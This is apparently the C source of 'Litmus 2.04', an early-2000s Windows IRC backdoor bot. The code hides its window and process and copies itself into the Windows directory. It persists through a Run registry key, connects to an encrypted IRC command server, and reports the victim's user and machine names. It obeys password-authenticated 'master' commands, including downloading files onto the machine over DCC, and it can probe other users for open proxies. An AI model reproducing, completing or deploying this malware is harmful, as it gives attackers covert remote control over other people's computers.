#include <windows.h>
#include <winsock.h>
#include <wininet.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <winreg.h>
#include <process.h>
#include <shellapi.h>
#include "main.h"


//#################
//ltm-trial.ath.cx | test1.litmuscrew.org | litmus.shacknet.nu | litmus.ath.cx    | notthistimebarsteds.homeip.net
// password .ident 00C58 | www | sts | sexx | web | dial (lame)
static char guest[] = "@@NICK            ";            //our nick
static char chankey[]= "@@KEY          ";         // channel key
int debug_on = 0;  // 1 is on 2 is off
//##########################
static char serverpass[]= "@@SPASS            ";     //server pass
char puff5[20];
#ifdef wingate
static char g_szClassName[] = "Litmus 2.04 + Gates";
#else
static char g_szClassName[] = "Litmus 2.04";
#endif

static char sz_exe_name[]= "@@EXE                    .";    //exefilename (demo1.exe \ MSGSRV32.EXE )




int decrypt();
void log_debug(char *log_this);
void get_f(SOCKET S_sock, LPARAM lParam);
int chat(SOCKET Csock, LPARAM lParam);
void CALLBACK bot_chk(HWND handl, UINT trash, UINT idevent, DWORD utctime);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
int Bot (WPARAM sockz, LPARAM msgg, WPARAM co_error);
void connectbot(void);
int parse (const char *buff, SOCKET sockz);
void serverout(const char *sr_out, SOCKET s);
// void CALLBACK closeid(HWND handd, UINT junkk, UINT idevent, DWORD utctime);
int ident(void);
int identactive(SOCKET isock, LPARAM lParam);
void privpar (char *inputs);

static int build_no = 115;    //started counting at 20 =)
char username[20];
char boxname[20];
char me[35];                    // its me =)

#ifdef onconnect
static char on_connect[]= "JOIN #IMP-ISO,#Pureiso,#puritydivx,#divxeurope,#isodcc,#winxp\r\n";
#endif

#ifdef wingate
void gate_back();
void gate_listen();
SOCKADDR_IN wingate_ip;
SOCKET tmpsock;
void gate();
#endif


static char nick[] = "NICK";
static char ping[] = "PING";            //ping
static HINSTANCE g_hInst = NULL;


LPHOSTENT lpHostEntry;
WSADATA wsaData;
SOCKADDR_IN sin;
static char join[] = "JOIN";
char buffer[900];
char buffer2[100];
char buffer3[100];


SOCKET clones[42];      //42 clones max... plenty
SOCKET ojsock;          //onjoin socket
SOCKET chatsock;

char in_nick[90];    //person who is /msging us
char in_ident[90];   //ident of person who is /msging us
char in_host[90];    //host of the person
char in_mtype[90];   //is it PRIVMSG or NOTICE ?
char in_dest[90];    //who are they talking to? me or the chan?
char in_parm1[90];
char in_parm2[90];
char in_parm3[90];
char in_parm4[90];
char in_parm5[90];
char in_parm6[90];
char *table[] = {
	in_nick, in_ident, in_host, in_mtype, in_dest, in_parm1, in_parm2, in_parm3, in_parm4, in_parm5, in_parm6 };

char *server;

char *TMPP;         //1024 byte buffer
char *home;         //our home dir
char *chatpath;   //path on chat 500 bytes

char *ojmsg;        //on join message for the OJ bot
char *ojfile;      // 300 bytes
char *ojme;       //my fake name
char *ojstain;    //fake file name
char ojconn[500];     //a string of what to do when we connect 500 bytes


char *fun[]= {
	"\"i have a fast computer, my computer can complete an infinate loop in 5 minutes\" -Cyrix employee from M$",
	"it was like \"do not use this product because it will probably kill you\" -Butter",
	"InternetGetConnectedState(); TerminateThread();",
	"Eddie lives somewhere in time",
	"A yellow Ribbon instead of a swastika",
	"I give a shot out to the living dead",
	"**NOTICE** If you cannot get your IRCD to work, please ask us in the channel... while waiting for a reply please sit down and read the book we included: it is a spanish story about a guy named \"Manual\" -devdev",
	"They dont gotta burn the books, they just remove them",
	"Just Victims of the in house drive-by, they say \"jump\", you say \"how high?\"",
	"No Escape from the Mass Crime Rate",
	"Play it again and again and rewind the tape",     //0-10
	"Buying all the products that there selling you",
	"Your brain dead... you got a fucking bullet in your head",
	"YOU GOT A BULLET IN YOUR FUCKING HEAD",
	"Get the fuck out the commode with the sure shot, sure to make your body drop",
	"They rally round your family with a pocket full of shells",
	"All eyes never on a floppy disk",
	"speak of the devil",
	"i plan on taking a bit of action",
	"so what are we gonna do about this?",
	"means someones did a bit of exploiting",   //0-20
	"i love lamers who play stupid dont you barb",
	"this should be fun",
	"im talking about the massive amount of emails you guys sent me ",
	"my isp takes it rather seriously actually",
	"nah fuck it, turn it off",
	"Damn Straight",
	"We dont need the key we will break it",
	"The world is yours...",
	"What a peice of shit",
	"You need to drop this \"Dont give a shit\" attitude", //0-30
	"Fuck the G-Ride i want the machines that are making them",
	"Even a broken watch is right twice a day",
	"I don't wanna hassle with making linux partitions. I want it done automagically -ColdFyre",
	"For great justice...",
	"Anger is a gift",  //0-35
	"come and play, come and play - forget about the movement",
	"One mind, Brute Force, and full of money",
	"Empty your pockets son",
	"names MacGuyver",
	"Fight the war, FUCK the norm!",      //0-40
	"Where ignorance rains, life is lost",
	"All my life I wanted a computer, now all I want is my life back. -async",
	"Fuck a cadilliac, Survive",
	"Server owners, admins, and IRCops are not responsible for anything found on this network",
	"The only thing worse than not knowing the truth is ruining the bliss of ignorance.",
	"I think I heard a shot"

};

static char onchat[]= "DrGreen was here...\r\n";

SOCKET sock_get[10];  //sockets being used to get files
HANDLE file_get[10];  //file handles being used to get files
int long    byte_get[10];  //how many bytes we have recieved

static char pass[]= "@@BPASS            ";

SOCKET botsock = 0;
SOCKET idsock;
int err;
int frozenchan;
static char fixfroze[]= "%s %s%d %s \r\n";
long pmath;
HWND hwnd;

static char ctcp_version[]= "VERSION";
static char ctcp_time[]= "TIME";
static char ctcp_ping[]= "PING";
static char ctcp_finger[]= "FINGER";
static char ctcp_dcc[]= "DCC";
static char ctcp_op[]= "OP";


static char serverT[] = "@@SERVER                              ";
static char target[] = "@@CHANNEL                            ";   //channel to join


char masternick[30];
char masterident[30];
char masterhost[70];

int last_time;    //last time a server message was recorded (gettickcount)
int op_key;      //just a random number
int im_opped;    // our we opped?
int is_ten;    //this int is incremented every minute untill it hits 10, then the bot does mode #chan -b litmus@blah if someone new has joined
int putmode;   //we need to put mode in target
int modes_caught; //how many times weve seen mode #target -b *!LITMUS@xxx in ten minutes

int filessent;

extern SOCKET oj_hub;



// -------
// Debug stuff
char debug_file_name[]= "debug.txt";
HANDLE debug_file_hand;
char szspace[]= " ";
int connected = 0;


LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	LONG regkeychk;
	BOOL cpied;
	HKEY newrkey;

	FARPROC regproc;
//    typedef void (*regproc) (int,int);
	HINSTANCE handQ;
//    regproc pfn;


	switch(Message)
	{
	case WM_ENDSESSION:
#ifdef debugg
		if(debug_on == 1) log_debug("(WndProc): WM_ENDSESSION *slam*!\r\n");
#endif
		serverout("QUIT :(WndProc): WM_ENDSESSION\r\n",botsock);
		SendMessage(hwnd,WM_CLOSE,0,0);
	case WM_CLOSE:
		DestroyWindow(hwnd);
#ifdef debugg
		if(debug_on == 1) log_debug("(WndProc): WM_CLOSE *Poof*\r\n");
#endif
		return DefWindowProc(hwnd, Message, wParam, lParam);
		break;
	case WM_CREATE:

		srand(time(NULL));   //random seeed//
		op_key = rand() + 200;
		TMPP = malloc(1025);
		home = malloc(301);
		ojmsg = malloc(600);
		ojfile = malloc(300);
		ojme = malloc(300);
		ojstain = malloc(300);
		chatpath = malloc(500);

		ZeroMemory(ojconn, 500);
		ZeroMemory(chatpath, 500);
		ZeroMemory(ojfile,300);
		ZeroMemory(home,300);
		ZeroMemory(ojme,300);
		ZeroMemory(ojstain,300);
		ZeroMemory(ojmsg,600);

		ZeroMemory(ojconn,500);
		lstrcat(ojconn,"NOTICE DrGreen :Help me liam\r\n");
		lstrcat(ojme,"Barbara");
		lstrcat(ojstain,"mypic.exe");
		ZeroMemory(TMPP,1025);
		GetWindowsDirectory(home,240);
		strcat(home,"\\litmus");
		CreateDirectory(home,0);
		strcat(home,"\\");
		lstrcat(chatpath,home);

		decrypt(target,target);
		decrypt(guest,guest);
		decrypt(serverpass,serverpass);
		decrypt(chankey,chankey);
		decrypt(pass,pass);
		decrypt(sz_exe_name,sz_exe_name);



		server = serverT;
		handQ = LoadLibrary("kernel32.dll");



  	    if(regproc = GetProcAddress(handQ, "RegisterServiceProcess"))
		{
			(*regproc)(0,1);
		}

		FreeLibrary(handQ);

		if (debug_on == 1)
		{
			sprintf(buffer2,"%s%s",home,debug_file_name);
			debug_file_hand = CreateFile(buffer2, GENERIC_WRITE, FILE_SHARE_READ, 0,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			if (debug_file_hand == INVALID_HANDLE_VALUE)
			{
				debug_on = 0;
			}
			else
			{
#ifdef debugg
				log_debug("(WndProc): [WM_CREATE] Bot Started....\r\n");
				sprintf(buffer,"(COMMAND LINE): %s\r\n",strtok(GetCommandLine(),"\""));
				log_debug(buffer);
#endif
			}
		}
//		if(strstr(GetCommandLine(),home) == NULL)
//		{   //lets install it
			memset(buffer2,0,100);
			lstrcat(buffer2,home);
			lstrcat(buffer2,sz_exe_name);

#ifdef debugg
			if(debug_on == 1)
			{
				log_debug("Installing...\r\n");
				sprintf(buffer,"(INSTALL) Target Exe: %s\r\n",buffer2);
				log_debug(buffer);
				sprintf(buffer,"(INSTALL) Source File: %s\r\n",(strtok(GetCommandLine(),"\"")));
				log_debug(buffer);
			}
#endif

			cpied = CopyFile(strtok(GetCommandLine(),"\""),buffer2,0);
			if(cpied)
			{
#ifdef debugg
				if (debug_on) log_debug("(INSTALL): File Copy Success\r\n");
//					ShellExecute(0,"open",buffer2,0,home,SW_HIDE);
			}
			else
			{

				if(debug_on) log_debug("(INSTALL): File Copy Failed\r\n");
//				SendMessage(hwnd,WM_CLOSE,0,0);
//				return 1;
#endif

			}

			//put it in the registry
			regkeychk = RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
				0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &newrkey, 0);
			if(regkeychk == ERROR_SUCCESS)
			{
#ifdef debugg
				if(debug_on) log_debug("(INSTALL): RegKey Generated Ok\r\n");
#endif
				regkeychk = RegSetValueEx(newrkey,"LTM2",0,REG_SZ,buffer2, (lstrlen(buffer2)+1));

#ifdef debugg
				if(regkeychk == ERROR_SUCCESS)
				{
					if (debug_on) sprintf(buffer,"(INSTALL): [Key Set Ok] %s Size+1: %u\r\n",buffer2,(lstrlen(buffer2)+1));
				}
				else
				{

					if (debug_on) sprintf(buffer,"(INSTALL): [Key Set Failed] %s Size+1: %u\r\n",buffer2,(lstrlen(buffer2)+1));

				}

				if (debug_on) log_debug(buffer);
#endif
				RegCloseKey(newrkey);

				//we made the key ok
			}
			else
			{
#ifdef debugg
				if(debug_on) log_debug("(INSTALL): Regkey Failed\r\n");
#endif
			}
#ifdef debugg
			if(debug_on) log_debug("(INSTALL): finished installing...\r\n");
#endif

//			SendMessage(hwnd,WM_CLOSE,0,0);

//		}


		return 1;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;

	case 8481:  //a thread has finished
		sprintf(buffer,"PRIVMSG %s :%s\r\n",target,wParam);
		serverout(buffer,botsock);
		break;


	case 5809:                          // DCC SEND CALL BACK
		get_f(wParam,lParam);
		return 1;
		break;

#ifdef wingate
	case 2688:               //just resolved a hostname, lets check it for socks
		if(!HIWORD(lParam))
		{
			tmpsock = socket( PF_INET, SOCK_STREAM, 0);
			if(tmpsock == INVALID_SOCKET)  break;
			wingate_ip.sin_port = htons(WINGATE_PORT);
			wingate_ip.sin_family = AF_INET;
			WSAAsyncSelect(tmpsock,hwnd,6784,FD_CONNECT);
			connect(tmpsock, &wingate_ip, sizeof(wingate_ip));
		}
		return 1;
		break;

	case 6784:
		gate(wParam,lParam);
		return 1;
		break;

	case 9201:
		gate_back(wParam,lParam);
		return 1;
		break;

#endif


	case 5808:                          // DCC CHAT call back
		chat(wParam,lParam);
		return 1;
		break;

	case 5804:
		link(wParam,lParam);            // the link thing
		return 1;
		break;

	case 5758:
		hub(wParam,lParam);            // hub ( like a big chat line )
		return 1;
		break;

	case 5807:                          // CLONES CALL BACK
		clonecallback(wParam,lParam);
		return 1;
		break;

	case 5567:
		ojcallback(wParam,lParam);      //Onjoin bot call back
		return 1;
		break;


	case 5050:
		identactive(wParam, lParam);
		return 1;
		break;

	case 52911:    // our botsocket is active//
		Bot(wParam, lParam, wParam);
		return 1;
		break;
	default:
		return DefWindowProc(hwnd, Message, wParam, lParam);
		break;
	}
	return 1;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
  	long nsize;
	WNDCLASSEX WndClass;
	MSG Msg;

	g_hInst = hInstance;

	WndClass.cbSize        = sizeof(WNDCLASSEX);
	WndClass.style         = 0;
	WndClass.lpfnWndProc   = WndProc;
	WndClass.cbClsExtra    = 0;
	WndClass.cbWndExtra    = 0;
	WndClass.hInstance     = g_hInst;
	WndClass.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hCursor       = LoadCursor(NULL, IDC_ARROW);
	WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	WndClass.lpszMenuName  = NULL;
	WndClass.lpszClassName = g_szClassName;
	WndClass.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

	if(!RegisterClassEx(&WndClass))
	{
		MessageBox(0, "Window Registration Failed!", "Error!",
			MB_ICONEXCLAMATION | MB_OK | MB_SYSTEMMODAL);
		return 0;
	}

	hwnd = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		g_szClassName,
		"LTM-II",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 320, 240,
		NULL, NULL, g_hInst, NULL);


	ZeroMemory(username,20);
	ZeroMemory(buffer2,100);

	nsize = 99;
	err = GetUserName(buffer2,&nsize);
	if (err != TRUE)
	{
		err = GetComputerName(buffer2,&nsize);
		if (err != TRUE)
		{
			lstrcat(buffer2,"wishing");
		}
	}


	for (err = 0; err < 19; err++)
	{
		if((buffer2[err] != (int)' ') && (buffer2[err] != (int)'.'))
		{
			username[err] = buffer2[err];
		}
	}
	#ifdef debugg
	MessageBox(0,username,"USERNAME:",MB_OK);
	#endif


	nsize = 20;
	err = GetComputerName(boxname, &nsize);
	if (err != TRUE)
	{
		lstrcat(boxname,"unknown");
	}


//	ShowWindow(hwnd, nCmdShow);
	UpdateWindow(hwnd);
	#ifndef debugg
	ShowWindow(hwnd,SW_HIDE);
	#else
	ShowWindow(hwnd,SW_NORMAL);
	#endif

    SetTimer(hwnd,500, 60000, &bot_chk);  // check to see if bot isonline every min

	err = MAKEWORD(1,1);
	err = WSAStartup(err, &wsaData);
	#ifdef wingate
		gate_listen();
	#endif

//	connectbot();


cycl:
	while(GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

		free(TMPP);
		free(ojconn);
		free(chatpath);
		free(home);
		free(ojmsg);
		free(ojfile);
		free(ojstain);
		free(ojme);

	return Msg.wParam;
}

/* ---------------------- */
/* Bot Socket Call back   */
/* ---------------------- */


int Bot (WPARAM sockz, LPARAM msgg, WPARAM co_error)
{
	char *ptr;           //a pointer variable//

 	memset(buffer, 0, 900);
	memset(buffer2,0, 100);
	err = LOWORD(msgg);
	switch (err)
	{
	case FD_CONNECT:
		if(!HIWORD(msgg))
		{
#ifdef debugg
			if(debug_on) log_debug("(BOT): Connection Established\r\n");
#endif
			sprintf(buffer,"PASS %s\r\n",serverpass);
			serverout(buffer,sockz);
			sprintf(buffer,"USER %s 127.0.0.1 127.0.0.1 :%s\r\n", username, boxname);
			serverout(buffer, sockz);
			sprintf(buffer,"%s %s%d%s",nick, guest,rand(),"\r\n");
			serverout(buffer,sockz);
			//send(sockz, srpong, lstrlen(srpong),0);
		}
		else
		{
			closesocket(sockz);
			botsock = 0;
#ifdef debugg
			if(debug_on)
			{
				switch(HIWORD(msgg))
				{
					case WSAECONNREFUSED:
						log_debug("(BOT): Connection Refused\r\n");
					break;
					case WSAETIMEDOUT:
						log_debug("(BOT): Connection Attempt Timed out\r\n");
					break;

					default:
						itoa(HIWORD(msgg),buffer2,10);
						sprintf(buffer,"(BOT): Undefined Connect Error: %s",buffer2);
						log_debug(buffer);
					break;
				}
			}
#endif

		}
		break;
	case FD_READ:
	 	memset(buffer, 0, 900);
		memset(buffer2,0, 100);
		ZeroMemory(buffer,900);
		ZeroMemory(buffer2,100);
		ZeroMemory(TMPP,1024);


		last_time = GetTickCount();
		recv(sockz,buffer,900,0);

#ifdef debugg
//		if(debug_on) log_debug("(BOT|FD_READ):");
//		if(debug_on) log_debug(buffer);
//		ZeroMemory(TMPP,1024);
#endif
		parse(buffer,sockz);




		ptr = strstr(buffer,"\r\n");    //looking for cr
		while (ptr != 0)
		{
			ptr = ptr +2;
			parse(ptr,sockz);
			ptr = strstr(ptr,"\r\n");
		}

		break;
	case FD_CLOSE:
		connected = 0;

#ifdef debugg
		if (debug_on == 1)
		{
			log_debug("Server socket closed... success\r\n");
		}
#endif

		closesocket(sockz);
		botsock = 0;
		connectbot();
		break;

	}
	return 1;
}


void connectbot(void)
{
	long int lpdwflags;
	frozenchan = 0;
	if(InternetGetConnectedState(&lpdwflags, 0)) // are we online?
	{
		char *server2 = malloc(200);

		ZeroMemory(server2,200);
		decrypt(server,server2);

		ident();

		#ifdef debugg
		if (debug_on) log_debug("(CONNECTBOT): Were online, Connecting...\r\n");
		#endif

		// CONNECT OUR BOT //
		sin.sin_addr.s_addr = inet_addr(server2);
		if (sin.sin_addr.s_addr == INADDR_NONE)
		{
			// The server name its not an ip, Resove it //
			lpHostEntry = gethostbyname( server2 );
			if (lpHostEntry != 0)
			{
				sin.sin_addr.s_addr = *(int long *)lpHostEntry->h_addr_list[0];
				#ifdef debugg
				if(debug_on)
				{
					sprintf(buffer,"(CONNECTBOT): Resolved %s to %s\r\n",server2,inet_ntoa(sin.sin_addr));
					log_debug(buffer);
				}
				#endif
			}
			else
		    {
				#ifdef debugg
				if(debug_on) log_debug("(CONNECTBOT): Non resolvable host\r\n");
				#endif
				return;
			}

		}
		botsock = socket( PF_INET, SOCK_STREAM, 0);
		err = WSAAsyncSelect(botsock, hwnd , 52911,       //9999 == OUR uMSG
			FD_CONNECT | FD_CLOSE | FD_READ);
		sin.sin_port = htons(6667);
		sin.sin_family = AF_INET;
		err = connect(botsock, &sin, sizeof(sin));  //connect to irc server //
		free(server2);
		return;
	}
	else
	{
		#ifdef debugg
		if(debug_on) log_debug("(CONNECTBOT): Computer is in offline mode\r\n");
		#endif
	}
}



int parse (const char *buff, SOCKET sockz)
{
    SOCKET chat_sock;
    int namelen;
    int i;
    char *tmpz;
	if (memcmp(buff, ping, 4) == 0)  //see if the server is sending a ping

	{
		ZeroMemory(buffer2,100);
		if (connected)
		{
			serverout("PONG :SERVER\r\n",sockz);
		}
		else
		{
	  	    sprintf(buffer2,"PONG%s\r\n",buff + 4);
			serverout(buffer2,sockz);
		}
		return 1;
	}

	if (memcmp(buff,"PONG",4) == 0) //its a PONG
	{
		return 1;
	}
	// This is the parser

	if (buff[0] == ':')
	{
		char *ptr;
		char *nmptr;
		char *ptr2;

		int ircn;
		nmptr = strchr(buff,' ');  //find the space :irc.emory.edu 001 :welcome
		if (nmptr != 0)
		{
			nmptr = nmptr + 1;
			ircn = atoi(nmptr);  // convert 001 to hex
			switch(ircn)
			{
			case 1: //welcome to the network  (were connected)
				connected = 1;

				memset(me,0,30);
				nmptr = strchr(nmptr,' ');  //find the second space, our nick :irc.ffoonet.net 001 YOU
				nmptr++;
				ptr2 = strchr(nmptr,' ');  //find the space _after_ our nick

				pmath = ptr2 - nmptr;  //get the size of our nick
				memcpy(me,nmptr++,pmath);

				sprintf(buffer2,"%s %s %s\r\n",join, target,chankey);
				serverout(buffer2, sockz);


				sprintf(buffer2,"MODE %s +i\r\n", me);
				serverout(buffer2,sockz);

				#ifdef onconnect
				serverout(on_connect,sockz);
				#endif

				im_opped = 0;
				modes_caught = 0;


				break;

				case 0:
					ZeroMemory(TMPP,1024);
					strcpy(TMPP,buff);
					privpar(TMPP); //break it up!
					ZeroMemory(buffer2,100);

					if ( *in_parm1 == '')  //is it a ctcp?
					{            // ------------------- CTCPS
						if (strcmp(ctcp_time,in_parm1) == 0) //ctcp time

						{
							struct tm *newtime;
							time_t ltime;
							time (&ltime);
							newtime = localtime(&ltime);
							sprintf(buffer2,"NOTICE %s :TIME %s\r\n",in_nick, asctime(newtime));
							serverout(buffer2,sockz);
							return 1;
						}

						if(strcmp(ctcp_ping,in_parm1) == 0) //someone is pinging us

						{
							sprintf(buffer2,"NOTICE %s :%s %s \r\n", in_nick, in_parm1, in_parm2);
							serverout(buffer2,sockz);
							return 1;
						}

						if(strcmp(ctcp_version,in_parm1) == 0)    // VERSION
						{
							int k = (rand() +45) % 45;
							sprintf(buffer2,"NOTICE %s :VERSION %s (C)2001 The Litmus Group :%s\r\n",in_nick, g_szClassName, fun[k]);
							serverout(buffer2,sockz);
							return 1;
						}
						   // CTCP OP
						if((strcmp(ctcp_op,in_parm1) == 0) && (strlen(in_parm2) != 0))
						{
							int checkq = atoi(in_parm2);
							if (op_key % 88  == checkq)
							{
								sprintf(buffer2,"MODE %s +o %s\r\n",target, in_nick);
								serverout(buffer2,sockz);
							}
						return 1;
						}

						if(strcmp(ctcp_finger,in_parm1) == 0)   // FINGER
						{
							int ticks;
							static char nt[] = "NT";
							static char ninex[] = "9x";
							char fingerme[200];
							char *mt;
							OSVERSIONINFO verinfo;

							ZeroMemory(&verinfo,sizeof(verinfo));
							verinfo.dwOSVersionInfoSize = sizeof(verinfo);
							GetVersionEx(&verinfo);
							if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT)	{	mt = nt; } 	else {	mt = ninex; }


							ticks = GetTickCount()/1000;
							sprintf(fingerme,"NOTICE %s :FINGER WINDOWS %s %u.%u %s BUILD#: %u Uptime: %u seconds\r\n",
						   		in_nick, mt, verinfo.dwMajorVersion , verinfo.dwMinorVersion, verinfo.szCSDVersion, verinfo.dwBuildNumber,  ticks);
							serverout(fingerme,sockz);
							return 1;
						}
						if(strcmp(ctcp_dcc,in_parm1) == 0)
						{
							if((strcmp(masterhost,in_host) == 0) && (strcmp(masternick,in_nick) == 0) && (strcmp(masterident,in_ident) == 0))
							{       //master is required for dcc
								if(strcmp(in_parm2,"CHAT") == 0)  //master wants to chat
								{
									if(chatsock) {	sprintf(buffer2,"NOTICE %s :Try .killchat\r\n",in_nick);  serverout(buffer2,sockz); return 1; }
									memset(strchr(in_parm5,''),0,2);
									sin.sin_addr.s_addr = htonl(atol(in_parm4));
									sin.sin_family = AF_INET;
									sin.sin_port = htons(atoi(in_parm5));
									chat_sock = socket(PF_INET, SOCK_STREAM, 0);
									err = WSAAsyncSelect(chat_sock, hwnd , 5808,
										FD_CONNECT | FD_CLOSE | FD_READ);
									err = connect(chat_sock, &sin, sizeof(sin));  //connect to chat
								}
								if(strcmp(in_parm2,"RESUME") == 0)
								{
									sprintf(buffer2,"NOTICE %s :resume requests are not supported!\r\n",in_nick);
									serverout(buffer2,sockz);
								}
								if(strcmp(in_parm2,"SEND") == 0)
								{
									for (i = 0; i < 10; i++ )
									{
										if(sock_get[i] == 0)
										{

											sprintf(TMPP,"%s%s",home,in_parm3); // C:\%home\file.ext
											file_get[i] = CreateFile(TMPP,GENERIC_WRITE,
												0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
											if (file_get[i] == INVALID_HANDLE_VALUE)
											{
												sprintf(buffer2,"NOTICE %s: error: INVALID_HANDLE_VALUE\r\n", in_nick);
												serverout(buffer2,sockz);
											}
											byte_get[i] = 0;
											memset(strchr(in_parm6,''),0,2);
											sin.sin_family = AF_INET;
											sin.sin_port = htons(atoi(in_parm5));
											sin.sin_addr.s_addr = htonl(atol(in_parm4));
											sock_get[i] = (int) socket(PF_INET,SOCK_STREAM,0);
											err = WSAAsyncSelect( (int) sock_get[i],hwnd,5809,
											FD_CLOSE | FD_READ);
											err = connect(sock_get[i], &sin,sizeof(sin));
											return 1;
										}

									}

								}
							}
						}

						return 1;     // unknown ctcp

					}
					if(strcmp("QUIT",in_mtype) == 0)
					{
						return 1;
					}
					if(strcmp("KICK",in_mtype) == 0)  // someone got kicked
					{
						if((strstr(in_dest,target) != 0) && (strcmp(in_parm1,me) == 0))  // i got kicked outta my own chan!
						{
							sprintf(buffer2,"PRIVMSG %s :Thanks alot asshole...\r\nJOIN %s %s\r\n", in_nick, in_dest, chankey);
							serverout(buffer2,sockz);
							im_opped = 0;
						}
						return 1;
					}

					if((strcmp("PART",in_mtype) == 0) && (strcmp(in_dest,target) == 0) && (strcmp(in_nick,me) ==0))
					{
						sprintf(buffer2,"JOIN %s %s\r\nPRIVMSG %s :HELP! I AM possesed!\r\n",target,chankey,target);
						serverout(buffer2,sockz);
						im_opped = 0;
					}

					if((strcmp("NICK",in_mtype) == 0) && (strcmp(me,in_nick) == 0))  //my nick is being changed!
					{
						memset(me,0,35);
						strcat(me,in_dest);
					}

					if(strcmp("JOIN",in_mtype) == 0) //someone joined
					{
						if((strcmp(in_nick,me) == 0) && (strcmp(in_dest,target) == 0)) // its me! I joined target!
						{
							im_opped = 0;
							return 1;
						}

						#ifdef wingate
						if(strcmp(in_nick,me) != 0)
						{
							wingate_ip.sin_addr.s_addr = inet_addr(in_host);
							if (wingate_ip.sin_addr.s_addr == INADDR_NONE)
							{
								WSAAsyncGetHostByName(hwnd,2668,in_host, &wingate_ip, sizeof(wingate_ip));
							}
							else
							{

								tmpsock = socket( PF_INET, SOCK_STREAM, 0);
								if(tmpsock == INVALID_SOCKET)  break;
								wingate_ip.sin_port = htons(WINGATE_PORT);
								wingate_ip.sin_family = AF_INET;
								WSAAsyncSelect(tmpsock,hwnd,6784,FD_CONNECT);
								connect(tmpsock, &wingate_ip, sizeof(wingate_ip));

							}


						}
						#endif


						if((strcmp(masterident,in_ident) == 0) && (strcmp(masterhost,in_host) == 0))
						{
							sprintf(buffer2,"MODE %s +o %s\r\n", in_dest, in_nick);
							serverout(buffer2,sockz);
						}
						else
						{

							if(strcmp(in_dest,target) == 0)
							{
								putmode = 1;
							}
							else
							{
								//sprintf(buffer2,"NOTICE %s :Welcome to %s\r\n", in_nick, in_dest);
								//serverout(buffer2,sockz);
							}
						}
						return 1;
					}

					if((strcmp("MODE", in_mtype) == 0) &&  (strcmp(in_dest,target) == 0))
					{
						//mode is going on in our chan
						if ((strstr("-k",in_parm1) != 0) && (im_opped == 1) && (strcmp(in_dest,target) == 0))
						{
							//some idiot unkeyed our channel
							sprintf(buffer2,"MODE %s +k %s\r\n",target, chankey);
							serverout(buffer2,sockz);
						}

						if ((strcmp("+o",in_parm1) == 0) && (strcmp(me,in_parm2) == 0) && (strcmp(target,in_dest)==0))     //someone gave me ops?
						{
							//sprintf(buffer2,"NOTICE %s :Thanks\r\n", in_nick);
							//serverout(buffer2,sockz);
							if ((putmode == 1) && (modes_caught < 1))
							{
								sprintf(buffer2,"MODE %s -b *!LITMUS@%u\r\n",in_dest, op_key);
								serverout(buffer2,sockz);
								putmode = 0;
							}
							im_opped = 1;
						}
						if ((strcmp("-o",in_parm1) == 0) && (strcmp(me,in_parm2) == 0) && (strcmp(target,in_dest) == 0))  //someone deoped me?
						{
							if (im_opped == 1)
							{
								sprintf(buffer2,"NOTICE %s :Asshole\r\n", in_nick);
								serverout(buffer2,sockz);
							}
							im_opped = 0;
							return 1;
						}

						if ((strcmp("-o",in_parm1) == 0) && (strcmp(in_dest,target) == 0))
						{
							if(strcmp(masternick,in_parm2) == 0)
							{
								sprintf(buffer2,"MODE %s -o+b %s *!*@%s\r\nKICK %s %s\r\n",target,in_nick, in_host, target, in_nick);
								serverout(buffer2,sockz);
								return 1;
							}
							else
							{
								putmode = 1;
							}
						}

						if ((strcmp("-b",in_parm1) == 0) && (strstr("LITMUS",in_parm3) != 0))
						{
							if (im_opped == 0)
							{
								int remainderQ = atoi(in_parm4);
								sprintf(buffer2,"PRIVMSG %s :%s %u\r\n",in_nick, ctcp_op, (remainderQ % 88));
								serverout(buffer2,sockz);
							}
							modes_caught++;

						}
						return 1;

					}


					if(strcmp("PRIVMSG",in_mtype) == 0)   // someones talking to us
					{
						if(strstr(in_ident,"lit") != 0)  //*lit* has to be in your ident
						{
							if((strcmp((char *)".ident",in_parm1) == 0) && (strcmp(pass,in_parm2) == 0))   //someone has identd with the right pass
							{
								memset(masternick,0,30);
								memset(masterident,0,30);
								memset(masterhost,0,70);
								lstrcat(masternick,in_nick);
								lstrcat(masterident,in_ident);
								lstrcat(masterhost,in_host);

								namelen = sizeof(sin);
								getsockname(sockz, &sin, &namelen);
								tmpz = inet_ntoa(sin.sin_addr);
								sprintf(buffer2,"NOTICE %s :Nice try lamer... Your ip (%s) is being automatically sent to the admin and you will be band of this server\r\n",in_nick, tmpz);
								serverout(buffer2,sockz);
#ifdef debugg
								if (debug_on == 1)
								{
									sprintf(buffer2,"(PARSE): %s!%s@%s is now a master\r\n",masternick,masterident,masterhost);
									log_debug(buffer2);
								}
#endif
								return 1;
							}

							if((strcmp(masterhost,in_host) == 0) && (strcmp(masternick,in_nick) == 0) && (strcmp(masterident,in_ident) == 0))
							{                   //weve got master commands here.....
								                //-----------------------------------
								if(strcmp(".op",in_parm1) == 0 && (strchr(in_dest,'#') != 0))
								{   //master is reqesting ops from a channel
									sprintf(buffer2,"MODE %s +o %s\r\n",in_dest,in_nick);
									serverout(buffer2,sockz);
									return 1;
								}
								if(strcmp(".op",in_parm1) == 0 && (strchr(in_dest,'#') == 0))
								{  //master is privmsging us with .op #chan nick
									sprintf(buffer2,"MODE %s +o %s\r\n",in_parm2,in_parm3);
									serverout(buffer2,sockz);
									return 1;
								}
